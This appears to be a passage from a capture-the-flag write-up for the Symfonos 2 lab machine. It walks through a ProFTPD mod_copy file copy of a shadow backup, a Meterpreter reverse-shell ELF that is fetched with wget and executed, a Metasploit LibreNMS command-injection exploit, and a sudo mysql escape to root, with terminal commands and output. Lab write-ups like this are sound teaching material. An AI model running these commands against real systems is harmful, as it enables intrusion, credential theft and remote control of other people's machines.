## 3. ProFTPD 1.3.5 — SITE CPFR/CPTO File Copy

ProFTPD 1.3.5 with `mod_copy` enabled allows unauthenticated file copies via the `SITE CPFR` / `SITE CPTO` commands. The server process runs as `aeolus`, who owns the SMB anonymous share at `/home/aeolus/share`. So we can copy `/var/backups/shadow.bak` directly into the share.

<TerminalOutput
  cmd="nc 10.0.0.93 21"
  rawHref="/writeups/raw/symfonos-2/ftp-cpfr"
  output={`220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.0.0.93]
site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/shadow.bak
250 Copy successful`}
/>

Now download it via SMB:

<TerminalOutput
  cmd="smbclient //10.0.0.93/anonymous -N"
  rawHref="/writeups/raw/symfonos-2/smb-shadow"
  output={`smb: \\> get shadow.bak
getting file \\shadow.bak of size 1173`}
/>

## 6. Meterpreter — Port Forward to LibreNMS

Generate a Meterpreter ELF payload and serve it:

<TerminalOutput
  cmd="msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=9002 -f elf -o reverse.elf"
  rawHref="/writeups/raw/symfonos-2/msfvenom"
  output={`Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: reverse.elf`}
/>

On the target as aeolus:

<TerminalOutput
  cmd="wget http://10.0.0.67/reverse.elf && chmod +x reverse.elf && ./reverse.elf"
  output={`reverse.elf  100%[=========>]  250  --.-KB/s  in 0s`}
/>

Meterpreter catches the session. Forward local port 1234 to the target's LibreNMS:

<TerminalOutput
  cmd="meterpreter > portfwd add -p 8080 -l 1234 -r 127.0.0.1"
  output={`[*] Forward TCP relay created: (local) :1234 -> (remote) 127.0.0.1:8080`}
/>

LibreNMS is now reachable at `http://localhost:1234`.

## 7. LibreNMS RCE — shell as cronus

LibreNMS has a known command injection vulnerability in the add host function (`librenms_addhost_cmd_inject`). Log in with `aeolus:sergioteamo` and exploit it:

<TerminalOutput
  cmd="use exploit/linux/http/librenms_addhost_cmd_inject"
  rawHref="/writeups/raw/symfonos-2/librenms-exploit"
  output={`set USERNAME aeolus
set PASSWORD sergioteamo
set RHOSTS localhost
set RPORT 1234
set LHOST 10.0.0.67
run

[*] Command shell session 2 opened (10.0.0.67:4444 -> 10.0.0.93:51252)

whoami
cronus`}
/>

## 8. Privilege Escalation — sudo mysql

<TerminalOutput
  cmd="sudo -l"
  output={`User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql`}
/>

`mysql` can spawn a shell with `-e '\! /bin/sh'`, and since it runs as root here that's an instant root shell:

<TerminalOutput
  cmd="sudo mysql -e '\! /bin/sh'"
  output={`# whoami
root`}
/>
